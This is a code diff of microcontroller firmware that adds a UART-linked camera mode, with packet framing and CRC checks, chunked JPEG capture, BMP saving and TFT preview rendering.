+  bool ok = cameraUartWaitPushResult(12000, pushStatus);
+  if (pushStatus.length() > 0) {
+    cameraLastError = pushStatus;
+    drawResultPopup(pushStatus, ok ? UI_OK : UI_WARN);
+    delay(1400);
+  } else {
+    drawResultPopup(ok ? "PUSH done" : "PUSH failed", ok ? UI_OK : UI_WARN);
+    delay(1400);
+  }
+  return ok;
+}
+
+static bool cameraUartWaitPushChunkAck(uint16_t seq, uint32_t timeoutMs, String &failStatus) {
+  failStatus = "";
+  uint32_t deadline = millis() + timeoutMs;
+
+  while ((int32_t)(deadline - millis()) > 0) {
+    uint8_t type = 0;
+    uint16_t len = 0;
+    if (!cameraUartReadPacket(type, cameraUartPayloadBuf, sizeof(cameraUartPayloadBuf), len)) {
+      continue;
+    }
+
+    if (type == CAM_PKT_CAPTURE_ACK && len >= 2) {
+      uint16_t gotSeq = (uint16_t)cameraUartPayloadBuf[0] | ((uint16_t)cameraUartPayloadBuf[1] << 8);
+      if (gotSeq == seq) return true;
+      continue;
+    }
+
+    if (type == CAM_PKT_STATUS) {
+      String s = "";
+      for (uint16_t i = 0; i < len; i++) s += (char)cameraUartPayloadBuf[i];
+      cameraHandleUartStatusText(s);
+      String low = s;
+      low.toLowerCase();
+      if (low.indexOf("push fail") >= 0 || low.indexOf("push seq mismatch") >= 0 || low.indexOf("push write fail") >= 0 || low.indexOf("push open fail") >= 0) {
+        failStatus = s;
+        return false;
+      }
+    }
+  }
+
+  return false;
+}
+
+static bool cameraUartWaitPushResult(uint32_t timeoutMs, String &finalStatus) {
+  uint32_t deadline = millis() + timeoutMs;
+  uint32_t lastUi = 0;
+  uint8_t dots = 0;
+
+  while ((int32_t)(deadline - millis()) > 0) {
+    if (!tftSleeping && (int32_t)(millis() - lastUi) > 180) {
+      lastUi = millis();
+      dots = (uint8_t)((dots + 1) % 4);
+      String msg = "Waiting";
+      for (uint8_t i = 0; i < dots; i++) msg += ".";
+      tft.fillRect(30, 140, 180, 10, UI_CARD);
+      tft.setTextSize(1);
+      tft.setTextColor(UI_MUTED);
+      tft.setCursor(30, 140);
+      tft.print(msg);
+    }
+
+    uint8_t type = 0;
+    uint16_t len = 0;
+    if (!cameraUartReadPacket(type, cameraUartPayloadBuf, sizeof(cameraUartPayloadBuf), len)) {
+      continue;
+    }
+
+    if (type == CAM_PKT_STATUS) {
+      String s = "";
+      for (uint16_t i = 0; i < len; i++) s += (char)cameraUartPayloadBuf[i];
+      cameraHandleUartStatusText(s);
+
+      String low = s;
+      low.toLowerCase();
+      if (low.startsWith("push saved")) {
+        finalStatus = s;
+        return true;
+      }
+      if (low.indexOf("push fail") >= 0 || low.indexOf("push seq mismatch") >= 0 || low.indexOf("push write fail") >= 0 || low.indexOf("push open fail") >= 0) {
+        finalStatus = s;
+        return false;
+      }
+    }
+  }
+
+  finalStatus = "PUSH timeout";
+  return false;
+}
+
+static void cameraUartSyncXiaoNetworkConfig() {
+  if (!cameraIsUartMode() || !cameraUartEnsureInit()) return;
+
+  String ssid = savedWifiSsid;
+  String pass = savedWifiPass;
+  if (ssid.length() == 0 && WiFi.isConnected()) {
+    ssid = WiFi.SSID();
+  }
+  if (ssid.length() == 0) return;
+
+  (void)cameraUartSendWifiConfig(ssid, pass);
+  (void)cameraUartSendTimeNow();
+}
+
+static void cameraUartAbortCapture(const char *reason) {
+  if (cameraUartCaptureFile) {
+    cameraUartCaptureFile.close();
+    if (cameraCapturePath.length() > 0 && LittleFS.exists(cameraCapturePath)) {
+      LittleFS.remove(cameraCapturePath);
+    }
+  }
+  cameraUartCaptureInProgress = false;
+  cameraUartCaptureCommandSent = false;
+  cameraUartCaptureExpected = 0;
+  cameraUartCaptureReceived = 0;
+  cameraUartCaptureNextSeq = 0;
+  cameraUartCaptureDeadlineMs = 0;
+  cameraUartCaptureLastDataMs = 0;
+  cameraCapturePending = false;
+  if (reason) {
+    cameraLastError = String(reason);
+    cameraToastMessage = "Failed";
+    cameraToastUntilMs = millis() + 3000;
+  }
+}
+
+static void cameraUartResetFrameState() {
+  cameraUartLinesReceived = 0;
+  cameraUartFrameReady = false;
+  memset(cameraUartLineSeen, 0, sizeof(cameraUartLineSeen));
+}
+
+static void cameraUartComputeLayout() {
+  float sx = (float)tft.width() / (float)cameraUartFrameW;
+  float sy = (float)tft.height() / (float)cameraUartFrameH;
+  float s = (sx < sy) ? sx : sy;
+  cameraDisplayW = (int16_t)((float)cameraUartFrameW * s + 0.5f);
+  cameraDisplayH = (int16_t)((float)cameraUartFrameH * s + 0.5f);
+  if (cameraDisplayW < 1) cameraDisplayW = 1;
+  if (cameraDisplayH < 1) cameraDisplayH = 1;
+  cameraDisplayX = (int16_t)((tft.width() - cameraDisplayW) / 2);
+  cameraDisplayY = (int16_t)((tft.height() - cameraDisplayH) / 2);
+}
+
+static String cameraMakeTimestampedPath(const char *ext) {
+  time_t now = time(nullptr);
+  if (now > 100000) {
+    struct tm tmv;
+    localtime_r(&now, &tmv);
+    char buf[40];
+    snprintf(buf, sizeof(buf), "/cam_%04d%02d%02d_%02d%02d%02d.%s",
+             tmv.tm_year + 1900, tmv.tm_mon + 1, tmv.tm_mday,
+             tmv.tm_hour, tmv.tm_min, tmv.tm_sec, ext);
+    return String(buf);
+  }
+  return String("/cam_") + String(millis()) + "." + String(ext);
+}
+
+static bool cameraUartSaveFrameBmp() {
+  if (!fsReady) return false;
+
+  uint16_t w = cameraUartFrameW;
+  uint16_t h = cameraUartFrameH;
+  if (w == 0 || h == 0) return false;
+
+  cameraCapturePath = cameraMakeTimestampedPath("bmp");
+  if (LittleFS.exists(cameraCapturePath)) LittleFS.remove(cameraCapturePath);
+  File f = LittleFS.open(cameraCapturePath, "w");
+  if (!f) return false;
+
+  uint32_t rowSize = (w * 3 + 3) & ~3;
+  uint32_t imageSize = rowSize * h;
+  uint32_t fileSize = 54 + imageSize;
+  uint8_t header[54] = {0};
+  header[0] = 'B'; header[1] = 'M';
+  header[2] = (uint8_t)fileSize; header[3] = (uint8_t)(fileSize >> 8);
+  header[4] = (uint8_t)(fileSize >> 16); header[5] = (uint8_t)(fileSize >> 24);
+  header[10] = 54;
+  header[14] = 40;
+  header[18] = (uint8_t)w; header[19] = (uint8_t)(w >> 8);
+  int32_t negH = -(int32_t)h;
+  header[22] = (uint8_t)negH; header[23] = (uint8_t)(negH >> 8);
+  header[24] = (uint8_t)(negH >> 16); header[25] = (uint8_t)(negH >> 24);
+  header[26] = 1;
+  header[28] = 24;
+  header[34] = (uint8_t)imageSize; header[35] = (uint8_t)(imageSize >> 8);
+  header[36] = (uint8_t)(imageSize >> 16); header[37] = (uint8_t)(imageSize >> 24);
+  f.write(header, sizeof(header));
+
+  uint8_t line[CAMERA_UART_MAX_W * 3 + 4];
+  for (uint16_t y = 0; y < h; y++) {
+    const uint16_t *src = cameraUartFrameBuf + (size_t)y * w;
+    for (uint16_t x = 0; x < w; x++) {
+      uint16_t c = src[x];
+      uint8_t r = (uint8_t)(((c >> 11) & 0x1F) * 255 / 31);
+      uint8_t g = (uint8_t)(((c >> 5) & 0x3F) * 255 / 63);
+      uint8_t b = (uint8_t)((c & 0x1F) * 255 / 31);
+      line[x * 3 + 0] = b;
+      line[x * 3 + 1] = g;
+      line[x * 3 + 2] = r;
+    }
+    uint8_t pad = (uint8_t)(rowSize - w * 3);
+    for (uint8_t i = 0; i < pad; i++) line[w * 3 + i] = 0;
+    f.write(line, rowSize);
+  }
+  f.close();
+
+  bmpViewPath = cameraCapturePath;
+  mediaStamp++;
+  cameraCaptureIndicatorUntilMs = millis() + 800;
+  return true;
+}
+
+static void cameraUartRenderFrame() {
+  if (!cameraUartFrameReady) return;
+  if (cameraUartLinesReceived < cameraUartFrameH) {
+    cameraUartDroppedFrames++;
+    return;
+  }
+
+  if (cameraUartNeedClear || !cameraUartHavePrev) {
+    tft.fillScreen(ST77XX_BLACK);
+  }
+
+  for (uint16_t dy = 0; dy < (uint16_t)cameraDisplayH; dy++) {
+    uint16_t sy = (uint16_t)((uint32_t)dy * cameraUartFrameH / (uint16_t)cameraDisplayH);
+    const uint16_t *srcRow = cameraUartFrameBuf + (size_t)sy * cameraUartFrameW;
+
+    if (!cameraUartNeedClear && cameraUartHavePrev) {
+      const uint16_t *prevRow = cameraUartPrevFrameBuf + (size_t)sy * cameraUartFrameW;
+      if (memcmp(srcRow, prevRow, (size_t)cameraUartFrameW * sizeof(uint16_t)) == 0) continue;
+    }
+
+    for (uint16_t dx = 0; dx < (uint16_t)cameraDisplayW; dx++) {
+      uint16_t sx = (uint16_t)((uint32_t)dx * cameraUartFrameW / (uint16_t)cameraDisplayW);
+      cameraUartScaledLine[dx] = srcRow[sx];
+    }
+    tft.drawRGBBitmap(cameraDisplayX, cameraDisplayY + dy, cameraUartScaledLine, (uint16_t)cameraDisplayW, 1);
+  }
+
+  memcpy(cameraUartPrevFrameBuf, cameraUartFrameBuf, (size_t)cameraUartFrameW * cameraUartFrameH * sizeof(uint16_t));
+  cameraUartHavePrev = true;
+  cameraUartNeedClear = false;
+
+  if (millis() < cameraCaptureIndicatorUntilMs) {
+    tft.fillRect(tft.width() - 18, 2, 16, 10, UI_ACCENT);
+    tft.setTextSize(1);
+    tft.setTextColor(UI_TEXT);
+    tft.setCursor(tft.width() - 16, 4);
+    tft.print("OK");
+  }
+
+  if ((millis() < cameraCtlOverlayUntilMs) || cameraUartCaptureInProgress || cameraUartCaptureCommandSent || millis() < cameraToastUntilMs) {
+    bool toastActive = (millis() < cameraToastUntilMs && cameraToastMessage.length() > 0);
+    bool toastSaved = toastActive && (cameraToastMessage == "Saved");
+    uint16_t boxFill = ST77XX_BLACK;
+    uint16_t boxLine = UI_LINE;
+    uint16_t textColor = UI_TEXT;
+    if (!cameraUartCaptureInProgress && !cameraUartCaptureCommandSent && toastActive) {
+      if (toastSaved) {
+        boxFill = ST77XX_GREEN;
+        boxLine = ST77XX_GREEN;
+        textColor = ST77XX_BLACK;
+      } else {
+        boxFill = ST77XX_RED;
+        boxLine = ST77XX_RED;
+        textColor = ST77XX_WHITE;
+      }
+    }
+    tft.fillRect(2, 2, 168, 30, boxFill);
+    tft.drawRect(2, 2, 168, 30, boxLine);
+    tft.setTextSize(1);
+    tft.setTextColor(textColor);
+    tft.setCursor(6, 6);
+    tft.print("M:");
+    tft.print((cameraModeAction == CAM_MODE_PHOTO) ? "PHOTO" : "VIDEO");
+    if (cameraRecordActive) tft.print(" REC");
+    tft.setCursor(6, 17);
+    tft.print("F:");
+    tft.print(CAM_FILTER_NAMES[cameraCtlFilter % CAM_FILTER_COUNT]);
+    tft.setCursor(84, 17);
+    tft.print("B:");
+    if (cameraCtlBrightness >= 0) tft.print('+');
+    tft.print((int)cameraCtlBrightness);
+    tft.setCursor(120, 17);
+    if (cameraUartCaptureInProgress || cameraUartCaptureCommandSent) {
+      tft.print("Saving...");
+    } else if (millis() < cameraToastUntilMs && cameraToastMessage.length() > 0) {
+      tft.print(cameraToastMessage);
+    } else if (millis() < cameraCaptureIndicatorUntilMs) {
+      tft.print("Saved");
+    }
+  }
+
+  cameraLastDisplayMs = millis();
+  cameraLastFrameMs = millis();
+  tftDirty = false;
+}
+
+static void cameraUartDrawRecordingOverlay() {
+  if (!cameraRecordActive && !cameraRecordProcessing) return;
+
+  const int16_t boxW = 192;
+  const int16_t boxH = 44;
+  const int16_t boxX = (tft.width() - boxW) / 2;
+  const int16_t boxY = (tft.height() - boxH) / 2;
+
+  tft.fillRoundRect(boxX, boxY, boxW, boxH, 10, ST77XX_BLACK);
+  tft.drawRoundRect(boxX, boxY, boxW, boxH, 10, UI_WARN);
+  tft.setTextSize(1);
+  tft.setTextColor(UI_TEXT);
+  tft.setCursor(boxX + 14, boxY + 10);
+  if (cameraRecordProcessing) tft.print("Processing recording");
+  else tft.print("Recording in progress");
+
+  uint8_t dots = (uint8_t)((millis() / 400) % 4);
+  String line2 = cameraRecordProcessing ? "Building AVI" : "Preview paused";
+  for (uint8_t i = 0; i < dots; i++) line2 += ".";
+  tft.setCursor(boxX + 14, boxY + 25);
+  tft.print(line2);
+
+  cameraLastDisplayMs = millis();
+  tftDirty = false;
+}
+
+static bool cameraUartReadPacket(uint8_t &type, uint8_t *payload, uint16_t payloadCap, uint16_t &outLen) {
+  outLen = 0;
+
+  uint32_t deadline = millis() + 220;
+  uint8_t prev = 0;
+
+  while ((int32_t)(deadline - millis()) > 0) {
+    bool found = false;
+    while ((int32_t)(deadline - millis()) > 0) {
+      if (Serial1.available() > 0) {
+        uint8_t b = (uint8_t)Serial1.read();
+        if (prev == CAM_PKT_HEAD1 && b == CAM_PKT_HEAD2) {
+          found = true;
+          break;
+        }
+        prev = b;
+      } else {
+        delay(1);
+      }
+    }
+    if (!found) break;
+
+    uint8_t meta[3] = {0};
+    if (!cameraUartReadBytes(meta, sizeof(meta), 35)) {
+      cameraLastError = "UART meta timeout";
+      return false;
+    }
+
+    uint16_t len = (uint16_t)meta[1] | (uint16_t)((uint16_t)meta[2] << 8);
+    if (len > payloadCap) {
+      cameraLastError = "UART resync(len)";
+      prev = 0;
+      continue;
+    }
+
+    if (len > 0 && !cameraUartReadBytes(payload, len, 85)) {
+      cameraLastError = "UART payload timeout";
+      return false;
+    }
+
+    uint8_t rxCrc = 0;
+    uint8_t tail[2] = {0};
+    if (!cameraUartReadBytes(&rxCrc, 1, 30) || !cameraUartReadBytes(tail, 2, 30)) {
+      cameraLastError = "UART tail timeout";
+      return false;
+    }
+
+    if (tail[0] != CAM_PKT_TAIL1 || tail[1] != CAM_PKT_TAIL2) {
+      cameraLastError = "UART resync(tail)";
+      prev = tail[1];
+      continue;
+    }
+
+    uint8_t calc = 0;
+    calc = cameraUartCrc8Update(calc, meta[0]);
+    calc = cameraUartCrc8Update(calc, meta[1]);
+    calc = cameraUartCrc8Update(calc, meta[2]);
+    for (uint16_t i = 0; i < len; i++) {
+      calc = cameraUartCrc8Update(calc, payload[i]);
+    }
+    if (calc != rxCrc) {
+      cameraLastError = "UART resync(crc)";
+      prev = 0;
+      continue;
+    }
+
+    type = meta[0];
+    outLen = len;
+    return true;
+  }
+
+  if (cameraLastError.length() == 0 || !cameraLastError.startsWith("UART resync")) {
+    cameraLastError = "UART packet timeout";
+  }
+  return false;
+}
+
+static void cameraProcessJpegFrame(uint8_t *jpgBuf, size_t jpgLen) {
+  if (!jpgBuf || jpgLen == 0) return;
+
+  uint16_t w = 0, h = 0;
+  if (TJpgDec.getJpgSize(&w, &h, jpgBuf, (uint32_t)jpgLen) != JDR_OK) {
+    cameraLastError = "Decode size fail";
+    if (++cameraFailCount >= 3) {
+      uint32_t backoff = min<uint32_t>(30000, (uint32_t)cameraFailCount * 2000);
+      cameraReconnectBackoffUntilMs = millis() + backoff;
+      cameraFailCount = 0;
+      cameraStop();
+    }
+    return;
+  }
+
+  uint8_t scale = 1;
+  while (scale < 8) {
+    uint8_t next = scale * 2;
+    if ((w / next) >= (uint16_t)tft.width() && (h / next) >= (uint16_t)tft.height()) scale = next;
+    else break;
+  }
+  if (scale > 8) scale = 8;
+  TJpgDec.setJpgScale(scale);
+  w = w / scale;
+  h = h / scale;
+
+  cameraFrameW = w;
+  cameraFrameH = h;
+  float sx = (float)tft.width() / (float)w;
+  float sy = (float)tft.height() / (float)h;
+  cameraDisplayScale = min(sx, sy);
+  cameraDisplayW = (int16_t)((float)w * cameraDisplayScale + 0.5f);
+  cameraDisplayH = (int16_t)((float)h * cameraDisplayScale + 0.5f);
+  cameraDisplayX = (int16_t)((tft.width() - cameraDisplayW) / 2);
+  cameraDisplayY = (int16_t)((tft.height() - cameraDisplayH) / 2);
+  cameraFrameX = (int16_t)((tft.width() - (int16_t)w) / 2);
+  cameraFrameY = (int16_t)((tft.height() - (int16_t)h) / 2);
+
+  if (cameraCapturePending) {
+    cameraCapturePending = false;
+    cameraCapturePath = cameraMakeTimestampedPath("jpg");
+    File f = LittleFS.open(cameraCapturePath, "w");
+    if (f) {
+      f.write(jpgBuf, jpgLen);
+      f.close();
+      bmpViewPath = cameraCapturePath;
+      mediaStamp++;
+      cameraCaptureIndicatorUntilMs = millis() + 800;
+    }
+  }
+
+  const bool forceRender = cameraCaptureActive || cameraCapturePending;
+  const bool renderAllowed = forceRender || (millis() - cameraLastDisplayMs >= CAMERA_MIN_FRAME_MS);
+
+  cameraLastFrameMs = millis();
+  cameraFailCount = 0;
+
+  if (renderAllowed) {
+    if (tftDirty) tft.fillScreen(ST77XX_BLACK);
+    TJpgDec.drawJpg(cameraFrameX, cameraFrameY, jpgBuf, (uint32_t)jpgLen);
+    if (cameraCaptureActive) {
+      cameraEndCapture();
+      cameraSkipTftDuringCapture = false;
+    }
+    if (millis() < cameraCaptureIndicatorUntilMs) {
+      tft.fillRect(tft.width() - 18, 2, 16, 10, UI_ACCENT);
+      tft.setTextSize(1);
+      tft.setTextColor(UI_TEXT);
+      tft.setCursor(tft.width() - 16, 4);
+      tft.print("OK");
+    }
+    cameraLastDisplayMs = millis();
+    tftDirty = false;
+  } else {
+    if (cameraCaptureActive && !renderAllowed) {
+      TJpgDec.drawJpg(cameraFrameX, cameraFrameY, jpgBuf, (uint32_t)jpgLen);
+      cameraEndCapture();
+      cameraSkipTftDuringCapture = false;
+    }
+  }
+}
+
+static void cameraLoopUart() {
+  if (millis() < cameraReconnectBackoffUntilMs) {
+    if (tftDirty) { tftDrawCameraStatus("UART backoff...", cameraLastError); tftDirty = false; }
+    return;
+  }
+
+  if (!cameraUartEnsureInit()) {
+    if (tftDirty) { tftDrawCameraStatus("UART init fail", cameraLastError); tftDirty = false; }
+    return;
+  }
+
+  bool frameIdleForRec = cameraRecordActive &&
+                         ((cameraLastFrameMs == 0) || (millis() - cameraLastFrameMs >= CAMERA_REC_FRAME_IDLE_PAUSE_MS));
+
+  if (frameIdleForRec &&
+      (millis() - cameraLastDisplayMs >= CAMERA_REC_OVERLAY_REFRESH_MS)) {
+    cameraUartDrawRecordingOverlay();
+  }
+
+  if (cameraCapturePending && !cameraUartCaptureCommandSent && !cameraUartCaptureInProgress) {
+    if (CAM_UART_TX_PIN < 0) {
+      cameraCapturePending = false;
+      cameraLastError = "Set CAM_UART_TX_PIN";
+    } else {
+      uint8_t cmd = CAM_CMD_CAPTURE_3MP;
+      if (cameraUartSendPacket(CAM_PKT_CMD, &cmd, 1)) {
+        cameraUartCaptureCommandSent = true;
+        cameraUartCaptureDeadlineMs = millis() + 90000;
+        cameraLastError = "Capture 3MP request...";
+      } else {
+        cameraCapturePending = false;
+        cameraLastError = "UART TX failed";
+      }
+    }
+  }
+
+  if (cameraRecordStartPending && !cameraUartCaptureInProgress) {
+    if (cameraUartSendSimpleCommand(CAM_CMD_REC_START)) {
+      cameraRecordStartPending = false;
+      cameraLastError = "Record start request...";
+      cameraToastMessage = "REC start";
+      cameraToastUntilMs = millis() + 1500;
+    }
+  }
+
+  if (cameraRecordStopPending) {
+    if (cameraUartSendSimpleCommand(CAM_CMD_REC_STOP)) {
+      cameraRecordStopPending = false;
+      cameraLastError = "Record stop request...";
+      cameraToastMessage = "REC stop";
+      cameraToastUntilMs = millis() + 1500;
+    }
+  }
+
+  if (cameraSdListPending) {
+    if (cameraUartSendSimpleCommand(CAM_CMD_SD_LIST)) {
+      cameraSdListPending = false;
+      cameraSdListCache = "";
+      cameraSdListLoading = true;
+    }
+  }
+
+  if ((cameraUartCaptureCommandSent || cameraUartCaptureInProgress) &&
+      cameraUartCaptureDeadlineMs > 0 &&
+      (int32_t)(millis() - cameraUartCaptureDeadlineMs) > 0) {
+    cameraUartAbortCapture("Capture timeout");
+    cameraToastMessage = "Capture timeout";
+    cameraToastUntilMs = millis() + 3000;
+  }
+
+  uint8_t type = 0;
+  uint16_t len = 0;
+  if (!cameraUartReadPacket(type, cameraUartPayloadBuf, sizeof(cameraUartPayloadBuf), len)) {
+    if (cameraUartCaptureInProgress &&
+        cameraUartCaptureExpected > 0 &&
+        cameraUartCaptureReceived >= cameraUartCaptureExpected &&
+        (int32_t)(millis() - cameraUartCaptureLastDataMs) > 600) {
+      if (cameraUartCaptureFile) cameraUartCaptureFile.close();
+      cameraUartCaptureInProgress = false;
+      cameraUartCaptureCommandSent = false;
+      cameraUartCaptureDeadlineMs = 0;
+      cameraUartCaptureLastDataMs = 0;
+      cameraCapturePending = false;
+      bmpViewPath = cameraCapturePath;
+      mediaStamp++;
+      cameraCaptureIndicatorUntilMs = millis() + 1000;
+      cameraLastError = "Capture saved";
+      cameraToastMessage = "Saved";
+      cameraToastUntilMs = millis() + 3000;
+      return;
+    }
+
+    if (cameraUartCaptureCommandSent || cameraUartCaptureInProgress) {
+      if (tftDirty) {
+        tftDrawCameraStatus("Capturing 3MP...", cameraLastError);
+        tftDirty = false;
+      }
+      return;
+    }
+
+    if (frameIdleForRec) {
+      if (millis() - cameraLastDisplayMs >= CAMERA_REC_OVERLAY_REFRESH_MS) {
+        cameraUartDrawRecordingOverlay();
+      }
+      return;
+    }
+
+    if (++cameraFailCount >= 6) {
+      uint32_t backoff = min<uint32_t>(15000, (uint32_t)cameraFailCount * 500);
+      cameraReconnectBackoffUntilMs = millis() + backoff;
+      cameraFailCount = 0;
+    }
+    if (tftDirty) {
+      tftDrawCameraStatus("Waiting UART frame...", cameraLastError);
+      tftDirty = false;
+    }
+    return;
+  }
+
+  if (millis() >= cameraToastUntilMs) cameraLastError = "";
+  cameraFailCount = 0;
+
+  bool pauseFrameRx = frameIdleForRec;
+
+  if (cameraUartCaptureCommandSent || cameraUartCaptureInProgress) {
+    cameraUartCaptureDeadlineMs = millis() + 60000;
+  }
+
+  if (type == CAM_PKT_FRAME_START) {
+    if (pauseFrameRx) return;
+    if (len != 4) return;
+    uint16_t w = (uint16_t)cameraUartPayloadBuf[0] | (uint16_t)((uint16_t)cameraUartPayloadBuf[1] << 8);
+    uint16_t h = (uint16_t)cameraUartPayloadBuf[2] | (uint16_t)((uint16_t)cameraUartPayloadBuf[3] << 8);
+    if (w == 0 || h == 0 || w > CAMERA_UART_MAX_W || h > CAMERA_UART_MAX_H) {
+      cameraLastError = "UART bad size";
+      return;
+    }
+    bool sizeChanged = (w != cameraUartFrameW) || (h != cameraUartFrameH);
+    cameraUartFrameW = w;
+    cameraUartFrameH = h;
+    cameraUartComputeLayout();
+    if (sizeChanged || tftDirty) {
+      cameraUartNeedClear = true;
+      cameraUartHavePrev = false;
+    }
+    cameraUartResetFrameState();
+  } else if (type == CAM_PKT_LINE) {
+    if (pauseFrameRx) return;
+    if (len < 2) return;
+    uint16_t y = (uint16_t)cameraUartPayloadBuf[0] | (uint16_t)((uint16_t)cameraUartPayloadBuf[1] << 8);
+    if (len != (uint16_t)(2 + cameraUartFrameW * 2)) return;
+    if (y >= cameraUartFrameH) return;
+    const uint8_t *src = cameraUartPayloadBuf + 2;
+    uint16_t *dst = cameraUartFrameBuf + (size_t)y * cameraUartFrameW;
+    for (uint16_t x = 0; x < cameraUartFrameW; x++) {
+      dst[x] = (uint16_t)((uint16_t)src[x * 2] << 8) | (uint16_t)src[x * 2 + 1];
+    }
+    if (!cameraUartLineSeen[y]) {
+      cameraUartLineSeen[y] = true;
+      cameraUartLinesReceived++;
+    }
+    cameraUartFrameReady = true;
+  } else if (type == CAM_PKT_FRAME_END) {
+    if (pauseFrameRx) {
+      cameraUartResetFrameState();
+      return;
+    }
+    cameraUartRenderFrame();
+    cameraUartResetFrameState();
+  } else if (type == CAM_PKT_CAPTURE_START) {
+    if (len != 4) {
+      cameraUartAbortCapture("Capture header bad");
+      return;
+    }
+    uint32_t totalLen =
+      (uint32_t)cameraUartPayloadBuf[0] |
+      ((uint32_t)cameraUartPayloadBuf[1] << 8) |
+      ((uint32_t)cameraUartPayloadBuf[2] << 16) |
+      ((uint32_t)cameraUartPayloadBuf[3] << 24);
+    if (totalLen < 1024 || totalLen > (5UL * 1024UL * 1024UL)) {
+      cameraUartAbortCapture("Capture size bad");
+      return;
+    }
+    if (cameraUartCaptureFile) cameraUartCaptureFile.close();
+    cameraCapturePath = cameraMakeTimestampedPath("jpg");
+    if (LittleFS.exists(cameraCapturePath)) LittleFS.remove(cameraCapturePath);
+    cameraUartCaptureFile = LittleFS.open(cameraCapturePath, "w");
+    if (!cameraUartCaptureFile) {
+      cameraUartAbortCapture("Capture file fail");
+      return;
+    }
+    cameraUartCaptureExpected = totalLen;
+    cameraUartCaptureReceived = 0;
+    cameraUartCaptureNextSeq = 0;
+    cameraUartCaptureLastDataMs = millis();
+    cameraUartCaptureInProgress = true;
+    cameraUartCaptureCommandSent = false;
+    cameraCapturePending = false;
+    cameraLastError = "Receiving 3MP...";
+  } else if (type == CAM_PKT_CAPTURE_CHUNK) {
+    if (!cameraUartCaptureInProgress || !cameraUartCaptureFile) return;
+    if (len < 3) {
+      cameraUartAbortCapture("Capture chunk short");
+      return;
+    }
+    uint16_t seq = (uint16_t)cameraUartPayloadBuf[0] | (uint16_t)((uint16_t)cameraUartPayloadBuf[1] << 8);
+    if (seq == (uint16_t)(cameraUartCaptureNextSeq - 1)) {
+      // Duplicate chunk retry: ACK again so sender can advance.
+      (void)cameraUartSendCaptureAck(seq);
+      return;
+    }
+    if (seq != cameraUartCaptureNextSeq) {
+      cameraUartAbortCapture("Capture chunk lost");
+      return;
+    }
+    cameraUartCaptureNextSeq++;
+
+    uint16_t dataLen = (uint16_t)(len - 2);
+    size_t wr = cameraUartCaptureFile.write(cameraUartPayloadBuf + 2, dataLen);
+    if (wr != dataLen) {
+      cameraUartAbortCapture("Capture write fail");
+      return;
+    }
+    cameraUartCaptureReceived += (uint32_t)dataLen;
+    cameraUartCaptureLastDataMs = millis();
+    (void)cameraUartSendCaptureAck(seq);
+  } else if (type == CAM_PKT_CAPTURE_END) {
+    if (!cameraUartCaptureInProgress && !cameraUartCaptureCommandSent) {
+      // Ignore duplicate CAPTURE_END after capture is already finalized.
+      return;
+    }
+
+    uint8_t status = (len >= 1) ? cameraUartPayloadBuf[0] : 0;
+    bool ok = (status == 1) && cameraUartCaptureInProgress && (cameraUartCaptureReceived > 0);
+    if (cameraUartCaptureFile) cameraUartCaptureFile.close();
+    cameraUartCaptureInProgress = false;
+    cameraUartCaptureCommandSent = false;
+    cameraUartCaptureDeadlineMs = 0;
+    cameraUartCaptureLastDataMs = 0;
+    cameraCapturePending = false;
+
+    if (ok) {
+      if (cameraUartCaptureExpected > 0 && cameraUartCaptureReceived != cameraUartCaptureExpected) {
+        cameraLastError = "Capture size mismatch";
+        cameraToastMessage = "Size mismatch";
+        cameraToastUntilMs = millis() + 3000;
+      } else {
+        bmpViewPath = cameraCapturePath;
+        mediaStamp++;
+        cameraCaptureIndicatorUntilMs = millis() + 1000;
+        cameraLastError = "Capture saved";
+        cameraToastMessage = "Saved";
+        cameraToastUntilMs = millis() + 3000;
+      }
+    } else {
+      if (cameraCapturePath.length() > 0 && LittleFS.exists(cameraCapturePath)) LittleFS.remove(cameraCapturePath);
+      cameraLastError = "Capture failed";
+      cameraToastMessage = "Capture failed";
+      cameraToastUntilMs = millis() + 3000;
+    }
+  } else if (type == CAM_PKT_STATUS) {
+    String s = "";
+    for (uint16_t i = 0; i < len; i++) s += (char)cameraUartPayloadBuf[i];
+    cameraHandleUartStatusText(s);
+  } else if (type == CAM_PKT_SD_LIST_CHUNK) {
+    for (uint16_t i = 0; i < len; i++) cameraSdListCache += (char)cameraUartPayloadBuf[i];
+  } else if (type == CAM_PKT_SD_LIST_END) {
+    if (cameraSdListCache.length() == 0) cameraSdListCache = "(empty)\n";
+    cameraSdListLoading = false;
+    cameraSdListLastUpdateMs = millis();
+    cameraSdListRequestMs = 0;
+  }
 }
 
 static bool cameraReadLine(String &out, uint32_t timeoutMs) {
@@ -6818,7 +9696,7 @@ static bool cameraReadBytes(uint8_t *buf, size_t len, uint32_t timeoutMs) {
 
 static bool cameraBeginCapture(uint16_t w, uint16_t h) {
   if (!fsReady) return false;
-  cameraCapturePath = String("/cam_") + String(millis()) + ".bmp";
+  cameraCapturePath = cameraMakeTimestampedPath("bmp");
   if (LittleFS.exists(cameraCapturePath)) LittleFS.remove(cameraCapturePath);
   cameraBmpFile = LittleFS.open(cameraCapturePath, "w");
   if (!cameraBmpFile) return false;
@@ -6977,6 +9855,11 @@ static void cameraLoop() {
   // enforce camera rotation while in camera mode
   tft.setRotation(3);
 
+  if (cameraIsUartMode()) {
+    cameraLoopUart();
+    return;
+  }
+
   if (!WiFi.isConnected()) {
     cameraStop();
     if (tftDirty) { tftDrawCameraStatus("WiFi not connected", ""); tftDirty = false; }
@@ -7072,117 +9955,23 @@ static void cameraLoop() {
     return;
   }
 
-  uint16_t w = 0, h = 0;
-  if (TJpgDec.getJpgSize(&w, &h, jpgBuf, (uint32_t)contentLength) != JDR_OK) {
-    free(jpgBuf);
-    cameraLastError = "Decode size fail";
-    if (++cameraFailCount >= 3) {
-      uint32_t backoff = min<uint32_t>(30000, (uint32_t)cameraFailCount * 2000);
-      cameraReconnectBackoffUntilMs = millis() + backoff;
-      cameraFailCount = 0;
-      cameraStop();
-    }
-    return;
-  }
-
-  // choose largest power-of-two scale such that decoded size is >= display size if possible
-  uint8_t scale = 1;
-  while (scale < 8) {
-    uint8_t next = scale * 2;
-    if ((w / next) >= (uint16_t)tft.width() && (h / next) >= (uint16_t)tft.height()) scale = next;
-    else break;
-  }
-  if (scale > 8) scale = 8;
-  TJpgDec.setJpgScale(scale);
-  w = w / scale;
-  h = h / scale;
-
-  cameraFrameW = w;
-  cameraFrameH = h;
-  // compute display scaling to fill TFT while preserving aspect ratio
-  float sx = (float)tft.width() / (float)w;
-  float sy = (float)tft.height() / (float)h;
-  cameraDisplayScale = min(sx, sy);
